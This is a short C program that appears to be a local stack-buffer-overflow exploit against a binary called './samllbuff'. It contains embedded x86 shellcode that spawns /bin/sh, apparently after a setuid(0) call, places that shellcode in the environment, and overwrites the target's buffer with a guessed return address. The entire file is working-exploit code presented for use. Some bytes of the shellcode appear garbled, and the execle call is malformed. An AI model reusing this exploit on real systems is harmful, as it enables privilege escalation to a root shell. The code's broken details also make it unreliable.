#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#define VULN "./samllbuff"
#define SIZE 160

char shellcode[] = 
	"\x31\xc0\xdb\xb0\x17\xcd\x80"
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc,char **argv){
	char p[SIZE];
	char *env[] = {shellcode,NULL};
	char *vuln[] = {VULN,p,NULL};
	int *ptr,i,addr;
	addr = 0xbffffffa - strlen(shellcode) - strlen(VULN);
	fprintf(stderr,"[***] using address: %#010x\n",addr);
	ptr = (int *)p;
	for(i=0;i<SIZE;i+=4)
		*ptr++ = addr;
	execle(vuln[0],vuln,p,NULL,env);
	exit(1);
}
